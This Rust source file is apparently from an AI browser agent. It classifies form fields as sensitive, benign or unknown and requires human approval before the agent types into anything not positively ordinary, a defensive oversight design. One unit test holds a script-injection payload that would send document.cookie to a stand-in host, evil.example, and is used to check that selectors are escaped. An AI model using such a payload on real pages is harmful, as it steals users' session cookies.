//! Deciding whether a fill target is sensitive — and admitting when we cannot tell.
//!
//! ## The rule: uncertainty is not permission
//!
//! `input[type=password]` and `autocomplete="cc-number"` catch the honest cases.
//! They do not catch a login form that masks a `type="text"` field in JavaScript, a
//! payment widget inside a shadow root, a custom `<stripe-input>` element, or a
//! cross-origin iframe. A classifier that only recognises the honest cases is
//! theatre: it would wave through exactly the fields an attacker (or a confused
//! model) would target.
//!
//! So there are three outcomes, not two — [`Sensitivity::Sensitive`],
//! [`Sensitivity::Benign`], and [`Sensitivity::Unknown`] — and **both `Sensitive`
//! and `Unknown` require a human**. Only a field we can positively see is
//! *ordinary* is typed into without asking. An unnecessary prompt is annoying; a
//! missed one is the whole gap back again.
//!
//! The signal-gathering runs in the page ([`PROBE_JS`]); the judgement is pure Rust
//! ([`classify`]), so every rule below is unit-testable without a browser.

use serde::{Deserialize, Serialize};

/// What the page told us about the fill target.
///
/// Every field is `#[serde(default)]`: a probe that partially fails yields empties,
/// which classify as [`Sensitivity::Unknown`] — i.e. "ask" — rather than as benign.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct FieldSignals {
    /// Did the selector match anything at all?
    #[serde(default)]
    pub found: bool,
    /// Lowercase tag name (`input`, `textarea`, or a custom element).
    #[serde(default)]
    pub tag: String,
    /// The `type` attribute, lowercased.
    #[serde(default)]
    pub kind: String,
    /// The `autocomplete` attribute, lowercased.
    #[serde(default)]
    pub autocomplete: String,
    /// `name`, `id`, `placeholder`, `aria-label`, and any associated `<label>`,
    /// concatenated and lowercased. One haystack; we only ever substring-search it.
    #[serde(default)]
    pub text: String,
    /// Is the element inside a shadow root? We cannot reason about what a custom
    /// component does with the keystrokes.
    #[serde(default)]
    pub shadow: bool,
    /// Does the element's `<form>` also contain a password field? A plain text box
    /// in a login form is very often the username — or a JS-masked password.
    #[serde(default)]
    pub form_has_password: bool,
    /// The page URL, for the prompt.
    #[serde(default)]
    pub url: String,
    /// Is the page HTTPS?
    #[serde(default)]
    pub secure: bool,
    /// The best human label we could find, for the prompt.
    #[serde(default)]
    pub label: String,
}

/// How much we trust ourselves about this field.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Sensitivity {
    /// Positively identified as a secret: a password, a card number, an OTP…
    Sensitive,
    /// Positively identified as an ordinary field. The only outcome that types
    /// without asking.
    Benign,
    /// We could not tell. Treated exactly like `Sensitive`.
    Unknown,
}

impl Sensitivity {
    /// Whether a human must approve before we type.
    ///
    /// **`Unknown` returns `true`.** This is the fail-closed hinge of the whole
    /// design; flipping it would restore the gap.
    pub fn needs_approval(self) -> bool {
        !matches!(self, Sensitivity::Benign)
    }
}

/// Words that mean "this is a secret". Substring-matched against `text`, so
/// `cardNumber`, `card_number`, and `Card Number` all hit.
const SENSITIVE_WORDS: &[&str] = &[
    // credentials
    "password",
    "passwd",
    "pwd",
    "passphrase",
    "pin",
    "secret",
    "token",
    "api key",
    "apikey",
    "private key",
    "seed phrase",
    "mnemonic",
    "recovery phrase",
    // payment
    "card number",
    "cardnumber",
    "credit card",
    "creditcard",
    "debit",
    "cvv",
    "cvc",
    "ccv",
    "security code",
    "card code",
    "expiry",
    "expiration",
    "iban",
    "sort code",
    "routing",
    "account number",
    "billing",
    // identity / one-time
    "ssn",
    "social security",
    "national insurance",
    "tax id",
    "passport",
    "one-time",
    "one time",
    "otp",
    "2fa",
    "mfa",
    "verification code",
    "auth code",
];

/// `autocomplete` values that are unambiguous. The spec gives us these for free,
/// and a page that sets them is telling us plainly what the field holds.
const SENSITIVE_AUTOCOMPLETE: &[&str] = &[
    "current-password",
    "new-password",
    "one-time-code",
    "cc-number",
    "cc-csc",
    "cc-exp",
    "cc-exp-month",
    "cc-exp-year",
    "cc-name",
    "cc-type",
];

/// `type` values we are willing to call ordinary — *if* nothing else is suspicious.
/// Everything not on this list (including anything new the HTML spec adds) is
/// `Unknown`, which means "ask".
const ORDINARY_TYPES: &[&str] = &[
    "text", "search", "email", "tel", "url", "number", "", // a bare <input> defaults to text
];

/// Judge a fill target. Pure: every rule here is testable without a browser.
pub fn classify(signals: &FieldSignals) -> Sensitivity {
    // We could not even find it. Something is wrong with our picture of the page —
    // do not type into it blind.
    if !signals.found {
        return Sensitivity::Unknown;
    }

    // The unambiguous secret.
    if signals.kind == "password" {
        return Sensitivity::Sensitive;
    }

    // The page told us, via the attribute designed to tell us. `autocomplete` is a
    // token list ("shipping cc-number"), so check the whole value and each token.
    let autocomplete = signals.autocomplete.trim();
    if SENSITIVE_AUTOCOMPLETE.contains(&autocomplete)
        || autocomplete
            .split_whitespace()
            .any(|token| SENSITIVE_AUTOCOMPLETE.contains(&token))
    {
        return Sensitivity::Sensitive;
    }

    // Named like a secret. Normalize separators first so `card_number`,
    // `card-number`, and `card number` all read the same — a field's `name` uses
    // `_`, its label uses spaces, and its id often uses `-`.
    let haystack = signals.text.replace(['_', '-'], " ");
    if SENSITIVE_WORDS
        .iter()
        .any(|word| haystack.contains(word) || signals.text.contains(word))
    {
        return Sensitivity::Sensitive;
    }

    // A text box sitting in a login form. Could be the username; could equally be a
    // password the site masks in JavaScript. We cannot tell them apart, and the
    // downside is asymmetric.
    if signals.form_has_password {
        return Sensitivity::Sensitive;
    }

    // Beyond here we are claiming the field is *ordinary*, so every remaining doubt
    // resolves to Unknown.

    // A custom component: we have no idea what it does with the keystrokes.
    if signals.shadow {
        return Sensitivity::Unknown;
    }
    if signals.tag != "input" && signals.tag != "textarea" {
        return Sensitivity::Unknown;
    }
    // A <textarea> has no `type`; an <input> must be one we recognise.
    if signals.tag == "input" && !ORDINARY_TYPES.contains(&signals.kind.as_str()) {
        return Sensitivity::Unknown;
    }

    Sensitivity::Benign
}

/// Why we are asking, in words a human can act on.
pub fn reason_for(signals: &FieldSignals, sensitivity: Sensitivity) -> String {
    let base = match sensitivity {
        Sensitivity::Sensitive if signals.kind == "password" => "This is a password field.",
        Sensitivity::Sensitive if signals.form_has_password => {
            "This field is in a form that contains a password."
        }
        Sensitivity::Sensitive => "This field looks like it holds a password, card, or code.",
        Sensitivity::Unknown if !signals.found => {
            "The field could not be inspected, so it cannot be checked for sensitivity."
        }
        Sensitivity::Unknown if signals.shadow => {
            "This field is inside a custom component, so it cannot be checked for sensitivity."
        }
        Sensitivity::Unknown => "This field could not be identified as an ordinary text box.",
        Sensitivity::Benign => "",
    };
    if !signals.secure && !signals.url.is_empty() {
        return format!("{base} The page is not using HTTPS.");
    }
    base.to_string()
}

/// The probe that runs in the page.
///
/// Pierces shadow roots when searching (a selector the page's own
/// `querySelector` cannot see is exactly the case we must not mistake for
/// "not found" *or* for benign), and reports `shadow: true` when it had to.
///
/// Any throw inside this becomes a failed evaluate, which the caller turns into
/// default (empty) signals — and empty signals classify as `Unknown`. So a probe
/// that breaks fails closed too.
pub const PROBE_JS: &str = r#"
(() => {
  const SEL = "__SELECTOR__";

  // Search the light DOM, then every shadow root, breadth-first.
  function find(root, sel) {
    const direct = root.querySelector(sel);
    if (direct) return { el: direct, shadow: false };
    const walk = root.querySelectorAll("*");
    for (const node of walk) {
      if (node.shadowRoot) {
        const hit = find(node.shadowRoot, sel);
        if (hit.el) return { el: hit.el, shadow: true };
      }
    }
    return { el: null, shadow: false };
  }

  const secure = location.protocol === "https:";
  const url = location.href;

  let hit;
  try { hit = find(document, SEL); } catch (_) { hit = { el: null, shadow: false }; }
  const el = hit.el;
  if (!el) {
    return { found: false, url, secure, shadow: hit.shadow };
  }

  const attr = (name) => (el.getAttribute(name) || "").toLowerCase();

  // The associated <label>, however it is attached.
  let label = "";
  try {
    if (el.id) {
      const forLabel = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
      if (forLabel) label = forLabel.innerText || "";
    }
    if (!label) {
      const wrapping = el.closest("label");
      if (wrapping) label = wrapping.innerText || "";
    }
    if (!label && el.labels && el.labels.length) {
      label = el.labels[0].innerText || "";
    }
  } catch (_) { /* label lookup is best-effort */ }

  // Does the surrounding form hold a password? Checks the form's own shadow-less
  // tree, which is where a password input would live.
  let formHasPassword = false;
  try {
    const form = el.closest("form");
    if (form && form.querySelector('input[type="password"]')) formHasPassword = true;
  } catch (_) { /* ignore */ }

  const text = [
    attr("name"),
    attr("id"),
    attr("placeholder"),
    attr("aria-label"),
    attr("data-testid"),
    (label || "").toLowerCase(),
  ].join(" ");

  return {
    found: true,
    tag: (el.tagName || "").toLowerCase(),
    kind: (el.type || attr("type") || "").toLowerCase(),
    autocomplete: (el.autocomplete || attr("autocomplete") || "").toLowerCase(),
    text,
    shadow: hit.shadow,
    form_has_password: formHasPassword,
    url,
    secure,
    label: (label || attr("placeholder") || attr("name") || "").trim(),
  };
})()
"#;

/// The probe, with `selector` substituted in as a JS string literal.
pub fn probe_for(selector: &str) -> String {
    // The selector is model-supplied. It is injected into a JS string literal, so
    // escape the characters that could close it — a selector like `"; fetch(...)`
    // must stay a selector.
    let escaped = selector
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r");
    PROBE_JS.replace("__SELECTOR__", &escaped)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn signals(kind: &str, text: &str) -> FieldSignals {
        FieldSignals {
            found: true,
            tag: "input".into(),
            kind: kind.into(),
            text: text.into(),
            url: "https://example.com".into(),
            secure: true,
            ..Default::default()
        }
    }

    #[test]
    fn a_password_input_is_sensitive() {
        assert_eq!(classify(&signals("password", "")), Sensitivity::Sensitive);
    }

    #[test]
    fn an_ordinary_text_box_is_benign_and_types_without_asking() {
        let search = signals("text", "search the site q");
        assert_eq!(classify(&search), Sensitivity::Benign);
        assert!(
            !classify(&search).needs_approval(),
            "an ordinary search box must not prompt, or the gate becomes noise \
             and users will click through it"
        );
    }

    /// The honest cases the spec hands us.
    #[test]
    fn sensitive_autocomplete_values_are_caught() {
        for value in [
            "current-password",
            "new-password",
            "one-time-code",
            "cc-number",
            "cc-csc",
        ] {
            let mut field = signals("text", "");
            field.autocomplete = value.into();
            assert_eq!(
                classify(&field),
                Sensitivity::Sensitive,
                "autocomplete={value} must be sensitive"
            );
        }
        // A token list, as the spec allows.
        let mut field = signals("text", "");
        field.autocomplete = "shipping cc-number".into();
        assert_eq!(classify(&field), Sensitivity::Sensitive);
    }

    /// The dishonest cases: `type="text"` fields that hold secrets anyway.
    #[test]
    fn a_text_field_named_like_a_secret_is_sensitive() {
        for name in [
            "cardNumber",
            "card_number",
            "Credit Card",
            "cvv",
            "security code",
            "otp",
            "one-time code",
            "ssn",
            "social security number",
            "iban",
            "seed phrase",
            "api key",
            "passphrase",
        ] {
            let field = signals("text", &name.to_lowercase());
            assert_eq!(
                classify(&field),
                Sensitivity::Sensitive,
                "a field named {name:?} must be sensitive"
            );
        }
    }

    /// The case the user called out: a login form that masks a `type="text"` field.
    /// We cannot tell it from a username box — so we ask.
    #[test]
    fn a_plain_text_field_inside_a_login_form_is_sensitive() {
        let mut field = signals("text", "user");
        field.form_has_password = true;
        assert_eq!(classify(&field), Sensitivity::Sensitive);
    }

    /// Shadow DOM: a custom component can do anything with the keystrokes.
    #[test]
    fn a_field_in_a_shadow_root_is_unknown_and_therefore_asks() {
        let mut field = signals("text", "");
        field.shadow = true;
        assert_eq!(classify(&field), Sensitivity::Unknown);
        assert!(classify(&field).needs_approval());
    }

    /// A custom payment widget — `<stripe-input>` and friends.
    #[test]
    fn a_custom_element_is_unknown_and_therefore_asks() {
        let mut field = signals("", "");
        field.tag = "stripe-input".into();
        assert_eq!(classify(&field), Sensitivity::Unknown);
        assert!(classify(&field).needs_approval());
    }

    /// An input type we do not recognise (including anything HTML adds later).
    #[test]
    fn an_unrecognised_input_type_is_unknown() {
        let field = signals("some-future-type", "");
        assert_eq!(classify(&field), Sensitivity::Unknown);
    }

    /// The probe failing, or the selector matching nothing, must never read as
    /// "benign".
    #[test]
    fn an_unfound_or_unprobed_field_is_unknown_not_benign() {
        assert_eq!(classify(&FieldSignals::default()), Sensitivity::Unknown);
        assert!(classify(&FieldSignals::default()).needs_approval());

        let missing = FieldSignals {
            found: false,
            ..Default::default()
        };
        assert_eq!(classify(&missing), Sensitivity::Unknown);
    }

    /// The fail-closed hinge. If this ever passes with `Benign` on the left, the
    /// whole gate is gone.
    #[test]
    fn only_a_positively_ordinary_field_skips_the_prompt() {
        assert!(Sensitivity::Sensitive.needs_approval());
        assert!(Sensitivity::Unknown.needs_approval());
        assert!(!Sensitivity::Benign.needs_approval());
    }

    #[test]
    fn a_textarea_is_ordinary_but_a_named_one_is_not() {
        let mut field = signals("", "message body");
        field.tag = "textarea".into();
        assert_eq!(classify(&field), Sensitivity::Benign);

        let mut secret = signals("", "recovery phrase");
        secret.tag = "textarea".into();
        assert_eq!(classify(&secret), Sensitivity::Sensitive);
    }

    /// A model-supplied selector must not be able to break out of the JS string it
    /// is interpolated into.
    #[test]
    fn a_selector_cannot_escape_the_probes_string_literal() {
        let probe = probe_for(r#"a"; fetch("https://evil.example?c="+document.cookie); //"#);
        assert!(
            !probe.contains(r#"a"; fetch"#),
            "the selector broke out of its string literal: {probe}"
        );
        assert!(
            probe.contains(r#"a\"; fetch"#),
            "expected the quote escaped"
        );

        let backslash = probe_for(r#"a\"#);
        assert!(backslash.contains(r"a\\"), "backslash must be escaped");
    }

    #[test]
    fn the_reason_names_http_because_that_changes_the_decision() {
        let mut field = signals("password", "");
        field.secure = false;
        let reason = reason_for(&field, Sensitivity::Sensitive);
        assert!(reason.contains("password"), "{reason}");
        assert!(reason.contains("HTTPS"), "{reason}");
    }
}
